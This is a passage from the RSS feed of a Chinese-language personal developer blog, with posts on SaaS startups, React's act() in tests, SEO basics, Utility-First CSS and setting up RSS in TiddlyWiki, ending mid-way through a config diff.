另外企业与个人不同，企业采购 SaaS 产品是要求收益的，要么提高效率降低成本，要么提高创新提高营收。如果达不到开源节流，即使是免费的产品，企业也不会导入。相反即使是费用不低的 SaaS 产品，如果帮助企业取得大于支出的收益，绝大多数企业都愿意导入。</p><h2 class="">2. 小微企业不是 SaaS 产品的理想客户</h2><blockquote><div>小微企业指员工数为 50 人以下的公司。</div></blockquote><p>由于小微企业的诸多特性，导致它们并不是 SaaS 产品的理想客户。</p><ol><li>业务、人员构成、管理方式都不稳定，导致他们在改善业务和提高效率上投资意愿低。他们愿意使用如微信，QQ一类的免费产品。</li><li>小微企业自身存活率不高，绝大多数都会在 2~3 年间消失。</li><li>从 SaaS 营销成本上看，一个 5k 的单子和一个 5w 的单子，成本基本相同，投资回报比低。</li></ol><h2 class="">3. SaaS 的本质是“续费”，CSM 是续费的关键。</h2><p>讲真，我真的不配说自己参加过创业团队，当时我们完全没有 CSM（客户成功管理）的概念。</p><p>CSM 是 SaaS 创业公司中非常重要的部分，他们承担了客户企业续费的 KPI。CSM 应该深入客户企业，结合客户企业所在行业，找到行业痛点，结合 SaaS 产品和客户企业一起探索解决方案，并反馈给产品团队。让客户企业需求和产品开发形成良性循环，客户企业保持续费意愿。</p><h2 class="">说点其他的</h2><p>SaaS 创业，光有满腔热血和技术是不够的，最好能有行业经验。如果你像我一样是个工程师，对行业了解甚少。要么自己深入到某个行业学习，要么结交一些行业内的专业人士。推荐方案2。</p><p>如果你也对 SaaS 感兴趣，或者你对某个行业有独到见解，欢迎与我联系。</p><p>最后推荐一个我自己一直在听的 Podcast 节目<a class="tc-tiddlylink-external" href="https://podcasts.apple.com/jp/podcast/%E7%96%AF%E6%8A%95%E5%9C%88/id1088178402" rel="noopener noreferrer" target="_blank">《疯投圈》</a></p><p>ref:</p><ul><li>Zenport: <a class="tc-tiddlylink-external" href="https://zenport.io/" rel="noopener noreferrer" target="_blank">https://zenport.io/</a></li></ul>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Sun, 13 June 2021 21:14:7 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2021-06-13–saas-chuang-ye-lu-xian-tu–xiang-jian-hen-wan-de-chuang-ye-zhi-dao-shou-ce</guid>      
   </item>

   <item>
      <title>2021-06-09 React Test 中 act() 有什么作用？</title>
      <link>https://thaddeusjiang.com/2021-06-09-react-test–zhong-act-—you-shi-me-zuo-yong-</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2021-06-09 React Test 中 act() 有什么作用？</h1>
            <hr>

            <p>可能 Frontend 门槛真的太低了。竟然有自称熟练掌握 React 的人回答不上来 React Test act() 的用途。</p><p>如果你在工作中使用 React，那么迟早你会遇到如下的测试代码。</p><pre class="js hljs"><code>it(<span class="hljs-string">"renders hello world"</span>, () =&gt; {
  act(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> {
    render(<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">HelloWorld</span> /&gt;</span></span>, container);
  });
  expect(container.textContent).toBe(<span class="hljs-string">"Hello, World."</span>);
});</code></pre><p>但是绝大多数时候，你的测试代码是这样的：</p><pre class="js hljs"><code>it(<span class="hljs-string">"renders hello world"</span>, () =&gt; {
  render(<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">HelloWorld</span> /&gt;</span></span>, container);
  expect(container.textContent).toBe(<span class="hljs-string">"Hello, World."</span>);
});</code></pre><p>act() 有什么作用呢？为什么有的时候需要，有的时候却不需要呢？</p><p>React Docs </p><blockquote><div>When writing UI tests, tasks like rendering, user events, or data fetching can be considered as “units” of interaction with a user interface. react-dom/test-utils provides a helper called act() that makes sure all updates related to these “units” have been processed and applied to the DOM before you make any assertions:</div></blockquote><p><strong>TL;DR</strong></p><p>很多时候，用户界面（UI）并不能一瞬间就被绘制完成，可能导致断言失败。act() 可以确保断言执行时 UI 已经被绘制完成。</p><h2 class="">act() 效果</h2><p>no act</p><p><img src="https://i.gyazo.com/d779e38551cfc4405010f9e64c41dbfa.png"></p><p>act render</p><p><img src="https://i.gyazo.com/5ed0da10697c2a6b8ccf24021b94b893.png"></p><p>那么是不是在所有测试中都应该写 act()？</p><p>理论上，写了绝对不会错，不写可能会出错。</p><p>不过不用担心，React 社区非常强大，已经有 open source 帮我们完成了这项枯燥乏味的工作。</p><p>Thanks testing-library</p><blockquote><div>All renders and events being fired are wrapped in act, so you don't really need this. </div></blockquote><h2 class="">我在面试中会如何提问 ?</h2><ol><li>你在项目中写测试吗？</li><li>如果 UI 存在异步或者耗时的操作，应该如何测试？</li><li>你了解 React test-utils act() 吗？</li><li>你能简单讲讲 act() 的原理吗？</li></ol><p>refs:</p><ul><li><a class="tc-tiddlylink-external" href="https://reactjs.org/docs/testing-recipes.html#act" rel="noopener noreferrer" target="_blank">https://reactjs.org/docs/testing-recipes.html#act</a></li><li><a class="tc-tiddlylink-external" href="https://github.com/threepointone/react-act-examples/blob/master/sync.md" rel="noopener noreferrer" target="_blank">https://github.com/threepointone/react-act-examples/blob/master/sync.md</a></li><li><a class="tc-tiddlylink-external" href="https://testing-library.com/docs/preact-testing-library/api/#act" rel="noopener noreferrer" target="_blank">https://testing-library.com/docs/preact-testing-library/api/#act</a></li></ul>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Wed, 9 June 2021 21:1:13 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2021-06-09-react-test–zhong-act-—you-shi-me-zuo-yong-</guid>      
   </item>

   <item>
      <title>2021-06-03 写给大家看的 SEO 目录</title>
      <link>https://thaddeusjiang.com/2021-06-03–xie-gei-da-jia-kan-de-seo–mu-lu</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2021-06-03 写给大家看的 SEO 目录</h1>
            <hr>

            <p>SEO 有两种完全不同的解释，90% 的人只知道其中一种。这是一个简单的目录，希望帮助大家对 SEO 有一个整体的认识。</p><h1 class="">1. 什么是 SEO</h1><p>两种完全不同的解释</p><ol><li>SEO（Search Engine Optimization）搜索引擎优化</li><li>SEO（Search Engine Optimizer）搜索引擎优化服务商</li></ol><p>但是 90% 的人对于 SEO 的理解是第一种，即：</p><blockquote><div>搜索引擎优化 (SEO) 通常是指对网站的部分内容进行细微的修改。单独来看，这些修改可能只是细微的改进，但与其他优化结合起来后，则可能会对您的网站的用户体验以及在自然搜索结果中的表现产生显著影响。</div></blockquote><h1 class="">2. 为什么需要 SEO</h1><ol><li>通过 Google 搜索推广在线内容或通过此类内容获利</li><li>通过 Google 刊登广告对网站在 Google 的搜索结果中的显示情况没有任何影响</li></ol><h1 class="">3. 入门级 SEO 可以做什么</h1><ol><li>提高曝光率，提高内容的量和质量（如：在社交媒体发布你的网址）</li><li>购买广告（🤔️，你或许会有疑问，让我给你解释）</li><li>聘请 SEO（search engine optimizer）</li></ol><h1 class="">4. 高级 SEO 可以做什么？</h1><h2 class="">1. 请求 Google 抓取你的网站</h2><p>如果你的网站刚刚开始，或者知名度极低，很有可能 Google 并不会将你的网站收录到数据库。</p><p>但是，你可以主动一点，主动请求 Google 抓取你的网站。</p><p>How-To:</p><p>你可以在 Google Search Console 中请求 Google 抓取你的网站，不过有一个前提，Google 需要你是网站的主人，即拥有 DNS 配置权力。</p><p><img src="https://i.gyazo.com/599a47fd7e8666037e115370cbe17f08.jpg"></p><p>ref: <a class="tc-tiddlylink-external" href="https://search.google.com/search-console" rel="noopener noreferrer" target="_blank">https://search.google.com/search-console</a>
</p><h2 class="">2. 天下武功唯快不破</h2><p>Google 喜欢 fast website。所以你应该尽可能提供更快的网站。</p><p>如果你不知道你的网站是否足够快，那么 Pagespeed 可以帮助你。</p><p><img src="https://i.gyazo.com/93f820daa90f113efd39e4f7c41722bf.jpg"></p><p>ref: <a class="tc-tiddlylink-external" href="https://developers.google.com/speed/pagespeed/insights/" rel="noopener noreferrer" target="_blank">https://developers.google.com/speed/pagespeed/insights/</a></p><h2 class="">3. 移动端友好</h2><p>Google 喜欢移动端友好的网站。</p><p>移动端友好不仅仅是 Responsive Design，还有低速网络、离线、移动端手势等等。</p><p>如果你不知道你的网站是否是移动端友好，mobile-friendly 可以帮助你。</p><p><img src="https://i.gyazo.com/353b772980800e47bd37ca26a69f09e8.jpg"></p><p><a class="tc-tiddlylink-external" href="https://search.google.com/test/mobile-friendly" rel="noopener noreferrer" target="_blank">https://search.google.com/test/mobile-friendly</a></p><h2 class="">4. 提供站点地图</h2><p>站点地图（Sitemap）是一种列有某个网站所有网址（URL）的XML文件，由Google最先发起。利用Sitemaps协议，网站管理员可以列出网站上可以供搜索引擎抓取的URL，并通知给后者。</p><p>形如：
<a class="tc-tiddlylink-external" href="https://thaddeusjiang.com/sitemap.xml" rel="noopener noreferrer" target="_blank">https://thaddeusjiang.com/sitemap.xml</a></p><p>虽然 Sitemap 对于网站来说。不是必须的，但是当你的网站还没有足够名气的时候，规规矩矩地提供 Google 需要的信息，有利无害。</p><p>你可以在 Google Search Console 中添加 Sitemap。</p><p><img src="https://i.gyazo.com/599a47fd7e8666037e115370cbe17f08.jpg"></p><p>ref: <a class="tc-tiddlylink-external" href="https://search.google.com/search-console" rel="noopener noreferrer" target="_blank">https://search.google.com/search-console</a>
</p><h2 class="">5. 使用 Lighthouse 审计代码质量</h2><p>作为 Web 开发者，相信大家一定对 Google DevTool 了若指掌。</p><p>Google 会根据网站的质量对网站进行打分，理论上质量越好的网站分数越高。</p><p>主要从下面几个方面</p><ol><li>Perfomance</li><li>Accessibility</li><li>Best Practices</li><li>SEO</li><li>PWA</li></ol><p>你可以使用和 Google 一样的工具对你的网站进行自测，这个工具就是 Lighthouse。</p><p><img src="https://i.gyazo.com/8f47ebdd1d8a508ac60b77bdd30e2fb7.jpg"></p><p>ref: <a class="tc-tiddlylink-external" href="https://github.com/GoogleChrome/lighthouse" rel="noopener noreferrer" target="_blank">https://github.com/GoogleChrome/lighthouse</a></p><h2 class="">6. 你或许不太熟悉的“结构化数据”</h2><h2 class="">7. 调查特定地区的关键字排名</h2><p>搜索引擎在不同地区对某个关键字展示的内容可能是不同的，所以要调查关键字排名，必须限定在你的目标地区。</p><p>有很多工具可以帮助你调查关键字排名，这里推荐一个免费的，TheHoth</p><p><img src="https://i.gyazo.com/ec92bf7a92d9fec2c1c94b91396999e7.jpg"></p><p>refs: <a class="tc-tiddlylink-external" href="https://www.thehoth.com/search-engine-rankings/" rel="noopener noreferrer" target="_blank">https://www.thehoth.com/search-engine-rankings/</a></p><h1 class="">总结 SEO</h1><blockquote class="tc-quote tc-big-quote"><p>要么你成为 SEO 专家，要么聘请你信任的 SEO 专家
</p><cite>TJ</cite></blockquote><ul><li>SEO 是一个费时费力的工作</li><li>SEO 对早期项目至关重要</li><li>SEO 很可能花了很多钱，但是没有任何收益，甚至有可能有风险</li></ul>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Thu, 3 June 2021 21:54:29 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2021-06-03–xie-gei-da-jia-kan-de-seo–mu-lu</guid>      
   </item>

   <item>
      <title>2021-05-15 详细介绍一下 why we should use Utility-First CSS</title>
      <link>https://thaddeusjiang.com/2021-05-15–xiang-xi-jie-shao-yi-xia-why-we-should-use-utility-first-css</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2021-05-15 详细介绍一下 why we should use Utility-First CSS</h1>
            <hr>

            <p>去年我写了一篇简单的文章解释为什么我使用 Tailwind CSS, <a class="tc-tiddlylink tc-tiddlylink-resolves" href="./#2020-07-21-why-tailwind-css">here</a></p><p>团队的成员读了以后反馈说“没讲清楚”，说我又来详细介绍一下 why we should use Utility-First CSS。</p><h2 class="">什么是 Utility-First CSS</h2><p>Utility-First CSS 是 Tailwind CSS 官方宣传的一种编写 CSS 的方式。</p><p>简单说：提供大量基础的 CSS classname，然后利用 CSS 的组合能力，想堆砌乐高积木一样编写 CSS。</p><h2 class="">在 Utility-First CSS 之前有哪些编写 CSS 的方式</h2><ul><li>BEM（Block Element Modifier）</li><li>SCSS</li><li>CSS-IN-JS</li><li>CSS Modules</li><li>...</li></ul><p><strong>为什么会有这么多种方式？</strong></p><p>要讨论这个问题，首先我们需要问 “这些开发方式试图解决什么问题？”</p><p>答：解决 CSS 模块化问题。</p><p>那么，CSS 模块化遇到了哪些问题？</p><blockquote class="tc-quote tc-big-quote"><ol><li>全局污染</li><li>命名混乱</li><li>依赖管理不彻底</li><li>无法共享变量</li><li>代码压缩不彻底</li></ol><cite><a class="tc-tiddlylink-external" href="https://github.com/camsong/blog/issues/5" rel="noopener noreferrer" target="_blank">https://github.com/camsong/blog/issues/5</a></cite></blockquote><p>在上述问题中，“全局污染” 可能是最受开发者诟病的问题了。</p><p>我以前也觉得 CSS global scope 是一个问题，但是学习了 Utility-First CSS 以后，我太爱 global scope 了。
只要使用得当，轻轻松松达到 Less is More 的效果。
</p><h2 class="">对比一下 BEM CSS 和 Utility-First CSS</h2><p>需求：一个简单的表格</p><p><strong>传统风格</strong></p><pre class="html hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span>
.table { ... }
.table-thead { ... }
.table-cell { ... }
.table-tbody { ... }
.table-row { ... }
.table-row &gt; .table-cell { ... }
<span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"table"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">thead</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"thead"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">th</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"table-cell"</span>&gt;</span>Name<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">th</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"table-cell"</span>&gt;</span>Age<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">th</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"table-cell"</span>&gt;</span>Address<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">thead</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">tbody</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"table-body"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"table-row"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"table-cell"</span>&gt;</span>Jiang<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"table-cell"</span>&gt;</span>29<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"table-cell"</span>&gt;</span>Japan<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"table-row"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"table-cell"</span>&gt;</span>Jiang<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"table-cell"</span>&gt;</span>29<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"table-cell"</span>&gt;</span>Japan<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">tbody</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span></code></pre><p>思考：</p><ul><li>有什么问题？</li></ul><p><strong>Utility-First 风格</strong></p><pre class="html hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bg-* m-* font-*"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">thead</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bg-* m-* font-*"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">th</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bg-* m-* font-*"</span>&gt;</span>Name<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">th</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bg-* m-* font-*"</span>&gt;</span>Age<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">th</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bg-* m-* font-*"</span>&gt;</span>Address<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">thead</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">tbody</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bg-* m-* font-*"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bg-* m-* font-*"</span>&gt;</span>Jiang<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bg-* m-* font-*"</span>&gt;</span>29<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bg-* m-* font-*"</span>&gt;</span>Japan<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bg-* m-* font-*"</span>&gt;</span>Jiang<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bg-* m-* font-*"</span>&gt;</span>29<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bg-* m-* font-*"</span>&gt;</span>Japan<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">tbody</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span></code></pre><p>思考：</p><ul><li>有什么感觉？</li><li>有没有解决上面提到的问题？</li></ul><p><strong>Utility-First 风格 + UI Component</strong></p><pre class="html hljs"><code>const Th = ({children}) =&gt; (<span class="hljs-tag">&lt;<span class="hljs-name">th</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bg-* m-* font-*"</span>&gt;</span>{{children}}<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>)
const Td = ({children}) =&gt; (<span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bg-* m-* font-*"</span>&gt;</span>{{chilren}}<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>)

<span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bg-* m-* font-*"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">thead</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bg-* m-* font-*"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Th</span>&gt;</span>Name<span class="hljs-tag">&lt;/<span class="hljs-name">Th</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Th</span>&gt;</span>Age<span class="hljs-tag">&lt;/<span class="hljs-name">Th</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Th</span>&gt;</span>Address<span class="hljs-tag">&lt;/<span class="hljs-name">Th</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">thead</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">tbody</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bg-* m-* font-*"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Td</span>&gt;</span>Jiang<span class="hljs-tag">&lt;/<span class="hljs-name">Td</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Td</span>&gt;</span>29<span class="hljs-tag">&lt;/<span class="hljs-name">Td</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Td</span>&gt;</span>Japan<span class="hljs-tag">&lt;/<span class="hljs-name">Td</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Td</span>&gt;</span>Jiang<span class="hljs-tag">&lt;/<span class="hljs-name">Td</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Td</span>&gt;</span>29<span class="hljs-tag">&lt;/<span class="hljs-name">Td</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Td</span>&gt;</span>Japan<span class="hljs-tag">&lt;/<span class="hljs-name">Td</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">tbody</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span></code></pre><p>思考：</p><ul><li>怎么样？</li></ul><p><strong>背后的思想是什么？</strong></p><blockquote class="tc-quote tc-big-quote"><p>组合由于继承
</p><cite>TJ</cite></blockquote><p>有一个 YouTube 视频，我之前分享过，大家可以看一下。<a class="tc-tiddlylink-external" href="https://youtu.be/3XaXKiXtNjw" rel="noopener noreferrer" target="_blank">https://youtu.be/3XaXKiXtNjw</a>
</p><h2 class="">总结 Why we should use Utility-First CSS</h2><p>Utility-First CSS 优点</p><ol><li>不用起名，不费脑。</li><li>责任清晰，开发速度快，容易修改，容易调试。</li><li>官方实现，bug 少</li></ol><p>Utility-First CSS 缺点</p><ol><li>将 CSS 结构化转移到 HTML 中，代码写的乱。（我不认同，稍后解释）</li><li>不利于爬虫（就是不让你爬）</li><li>需要记忆新的 class（比 CSS 少 10 倍）</li></ol><p>个人观点</p><ul><li>这不是新技术，这是最基本、最核心的技术。</li><li>真正提高开发效率、代码品质、且可以掌握的技术。</li><li>尽早采用。</li></ul>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Mon, 10 May 2021 23:10:36 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2021-05-15–xiang-xi-jie-shao-yi-xia-why-we-should-use-utility-first-css</guid>      
   </item>

   <item>
      <title>2021-04-29 重启 RSS</title>
      <link>https://thaddeusjiang.com/2021-04-29–zhong-qi-rss</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2021-04-29 重启 RSS</h1>
            <hr>

            <p>其实我非常喜欢 RSS，非常推荐大家也尝试 RSS。</p><blockquote class="tc-quote tc-big-quote"><p>RSS 让我们可以从容不迫地面对<strong>信息轰炸</strong>，让我们免于被算法洗脑，让我们成为我们自己。
</p><cite>TJ</cite></blockquote><p>feed: <a class="tc-tiddlylink-external" href="https://thaddeusjiang.com/rss.xml" rel="noopener noreferrer" target="_blank">https://thaddeusjiang.com/rss.xml</a></p><p>我是如何实现 RSS 的？</p><p>Step 1: 实现一个 TiddlyWiki render</p><pre><code>created: 20200913085259429
modified: 20201117084124255
revision: 0
tags: $:/plugins/adithyab/tiddlyjam/internals
title: $:/plugins/adithyab/tiddlyjam/renderer/rss
type: text/vnd.tiddlywiki

&amp;lt;?xml version="1.0" encoding="UTF-8"?&amp;gt;
&amp;lt;rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"&amp;gt;
&amp;lt;channel&amp;gt;

   &amp;lt;title&amp;gt;{{$:/SiteTitle}}&amp;lt;/title&amp;gt;
   &amp;lt;link&amp;gt;&lt;$text text={{$:/AbsoluteBaseUrl}}/&gt;&amp;lt;/link&amp;gt;
   &amp;lt;atom:link href="&lt;$text text={{$:/AbsoluteBaseUrl}}/&gt;/rss.xml" rel="self" type="application/rss+xml" /&amp;gt;
   &amp;lt;description&amp;gt;{{$:/SiteSubtitle}}&amp;lt;/description&amp;gt;

&lt;$list filter="[tag[$:/plugins/adithyab/tiddlyjam/live]!sort[title]]"&gt;
   &amp;lt;item&amp;gt;
      &amp;lt;title&amp;gt;{{!!title}}&amp;lt;/title&amp;gt;
      &amp;lt;link&amp;gt;&lt;$text text={{$:/AbsoluteBaseUrl}}/&gt;/&lt;$macrocall $name="tv-get-export-path" title={{!!title}}/&gt;&amp;lt;/link&amp;gt;
      &amp;lt;guid&amp;gt;&lt;$text text={{$:/AbsoluteBaseUrl}}/&gt;/&lt;$macrocall $name="tv-get-export-path" title={{!!title}}/&gt;&amp;lt;/guid&amp;gt;
   &amp;lt;/item&amp;gt;
&lt;/$list&gt;
&amp;lt;/channel&amp;gt;
&amp;lt;/rss&amp;gt;
</code></pre><p>Step 2: 修改 tiddlywiki.info</p><pre class="diff hljs"><code>{
    "description": "Basic client-server edition",
    ...
    "build": {
        ...
        "tiddlyjam":[
            "--rendertiddlers",
            "[all[tiddlers+shadows]tag[$:/plugins/adithyab/tiddlyjam/live]]",
            "$:/plugins/adithyab/tiddlyjam/renderer/base",
            ".",
            "text/plain",
            "--render",
            "[all[tiddlers+shadows][$:/plugins/adithyab/tiddlyjam/renderer/sitemap]]",
            "sitemap.xml",
            "text/plain",
<span class="hljs-addition">+            "--render",</span>
<span class="hljs-addition">+            "[all[tiddlers+shadows][$:/plugins/adithyab/tiddlyjam/renderer/rss]]",</span>
<span class="hljs-addition">+            "rss.xml",</span>
